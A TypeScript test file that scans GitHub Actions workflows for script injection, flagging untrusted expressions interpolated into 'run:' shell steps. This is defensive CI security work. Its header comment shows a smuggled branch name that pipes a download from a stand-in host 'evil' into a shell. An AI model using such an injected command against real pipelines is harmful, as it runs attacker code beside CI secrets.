/**
 * INVARIANT: No workflow input is interpolated into a shell (OSE-1470 / OSE-1499)
 *
 * GitHub substitutes `${{ ... }}` into a `run:` script BEFORE the shell sees
 * it. A value an outside party controls — a branch name
 * (`github.event.workflow_run.head_branch`, `github.head_ref`), any other
 * `github.event.*` field, or a `workflow_dispatch` / `workflow_call` input
 * (`inputs.*`, `github.event.inputs.*`) — therefore becomes shell code: a branch
 * named `x";curl evil|sh;"` runs on the runner, next to every secret the step
 * holds. This is GitHub's documented "script injection" class.
 *
 * The safe shape is to pass the value through the step's `env:` and read it as
 * a quoted shell variable:
 *
 *     env:
 *       FORCE_CLEAN: ${{ inputs.force_clean }}
 *     run: |
 *       if [ "$FORCE_CLEAN" != "true" ]; then ...
 *
 * `if:` and `with:` expressions are not shell and are not checked here.
 *
 * Gate shape (README "property or subject?"): PROPERTY-ASSERTING. It derives
 * its subjects by walking every `.github/workflows/*.yml|yaml` and every
 * `.github/actions/**\/action.yml|yaml`, parses each with js-yaml, and checks
 * every step's `run:` string (workflow jobs and composite-action steps). A
 * workflow added next month is covered the day it lands. Negative controls
 * assert the walk parsed workflows and found `run:` steps, and that the
 * detector flags each forbidden form, so "found nothing" cannot mean "looked
 * at nothing".
 *
 * Born-red: on origin/main 5f4381f this spec failed and named every
 * interpolation (oursharedevents-ci.yml `inputs.force_clean` x10,
 * security-triage.yml `github.event.workflow_run.head_branch`, ...). It passes
 * once they are routed through `env:`.
 */

import { test, expect } from '@playwright/test';
import { readFileSync, existsSync, readdirSync, statSync } from 'node:fs';
import { join, relative } from 'node:path';
import yaml from 'js-yaml';

const REPO_ROOT = join(__dirname, '..', '..', '..');
const WORKFLOWS_DIR = join(REPO_ROOT, '.github', 'workflows');
const ACTIONS_DIR = join(REPO_ROOT, '.github', 'actions');

// `${{` then, inside the same expression, a context an outside party controls.
// `github.event_name` is NOT matched (underscore, not a dot) — it is a fixed
// enum set by GitHub, not attacker text. `github.ref` / `github.ref_name` ARE
// matched: on push they carry a branch name the pusher chose. `github.ref_type`
// and `github.ref_protected` are not (fixed values); the lookahead stops there.
const FORBIDDEN =
  /\$\{\{[^}]*?(github\.event\.|inputs\.|github\.head_ref|github\.ref(?:_name)?(?![\w]))/;

type Step = { name?: string; id?: string; run?: unknown };
type Finding = { file: string; where: string; expr: string };

function walkActionFiles(dir: string, out: string[] = []): string[] {
  if (!existsSync(dir)) return out;
  for (const entry of readdirSync(dir)) {
    const p = join(dir, entry);
    if (statSync(p).isDirectory()) walkActionFiles(p, out);
    else if (entry === 'action.yml' || entry === 'action.yaml') out.push(p);
  }
  return out;
}

function workflowFiles(): string[] {
  if (!existsSync(WORKFLOWS_DIR)) return [];
  return readdirSync(WORKFLOWS_DIR)
    .filter((f) => f.endsWith('.yml') || f.endsWith('.yaml'))
    .map((f) => join(WORKFLOWS_DIR, f));
}

/** Every step (with where-label) in a parsed workflow or composite action. */
function stepsOf(doc: any): Array<{ where: string; step: Step }> {
  const out: Array<{ where: string; step: Step }> = [];
  if (!doc || typeof doc !== 'object') return out;
  const jobs = doc.jobs && typeof doc.jobs === 'object' ? doc.jobs : {};
  for (const [jobId, job] of Object.entries<any>(jobs)) {
    const steps = Array.isArray(job && job.steps) ? job.steps : [];
    steps.forEach((s: Step, i: number) =>
      out.push({ where: `jobs.${jobId}.steps[${i}]${s && s.name ? ` "${s.name}"` : ''}`, step: s })
    );
  }
  const runsSteps = doc.runs && Array.isArray(doc.runs.steps) ? doc.runs.steps : [];
  runsSteps.forEach((s: Step, i: number) =>
    out.push({ where: `runs.steps[${i}]${s && s.name ? ` "${s.name}"` : ''}`, step: s })
  );
  return out;
}

function scan(): { parsed: number; runSteps: number; findings: Finding[] } {
  const files = [...workflowFiles(), ...walkActionFiles(ACTIONS_DIR)];
  let parsed = 0;
  let runSteps = 0;
  const findings: Finding[] = [];
  for (const file of files) {
    const doc = yaml.load(readFileSync(file, 'utf8'));
    parsed++;
    for (const { where, step } of stepsOf(doc)) {
      if (!step || typeof step.run !== 'string') continue;
      runSteps++;
      const lines = step.run.split('\n');
      for (const line of lines) {
        const m = line.match(FORBIDDEN);
        if (m) {
          const start = line.indexOf('${{', m.index ?? 0);
          const end = line.indexOf('}}', start);
          findings.push({
            file: relative(REPO_ROOT, file),
            where,
            expr: line.slice(start, end === -1 ? undefined : end + 2),
          });
        }
      }
    }
  }
  return { parsed, runSteps, findings };
}

test.describe('Invariant: no workflow input interpolated into a shell (OSE-1470)', () => {
  test('OSE-INV-WFINJ | security | negative control | the walk parses workflows and finds run steps', () => {
    const { parsed, runSteps } = scan();
    expect(parsed, 'expected at least one workflow under .github/workflows').toBeGreaterThan(0);
    expect(
      runSteps,
      'parsed workflows but found no `run:` steps — the step walk is broken'
    ).toBeGreaterThan(0);
  });

  test('OSE-INV-WFINJ | security | negative control | the detector flags every forbidden form', () => {
    for (const bad of [
      'echo "${{ inputs.force_clean }}"',
      "if [ '${{inputs.x}}' = y ]",
      'git checkout ${{ github.event.workflow_run.head_branch }}',
      'echo ${{ github.event.inputs.environment }}',
      'echo ${{ github.event.pull_request.title }}',
      'echo ${{ github.head_ref }}',
    ]) {
      expect(FORBIDDEN.test(bad), `detector must flag: ${bad}`).toBe(true);
    }
    for (const ok of [
      'echo "$FORCE_CLEAN"',
      'echo ${{ github.event_name }}',
      'echo ${{ env.STG_BASE_URL }}',
      'echo ${{ steps.x.outputs.y }}',
      'echo ${{ github.sha }}',
    ]) {
      expect(FORBIDDEN.test(ok), `detector must not flag: ${ok}`).toBe(false);
    }
  });

  test('OSE-INV-WFINJ | security | property | no run: block interpolates github.event.* / inputs.* / github.head_ref', () => {
    const { findings } = scan();
    const listing = findings.map((f) => `  ${f.file} ${f.where}: ${f.expr}`).join('\n');
    expect(
      findings,
      `workflow values interpolated straight into a shell (script injection). Pass each through the step's env: and use a quoted "$VAR":\n${listing}`
    ).toEqual([]);
  });
});
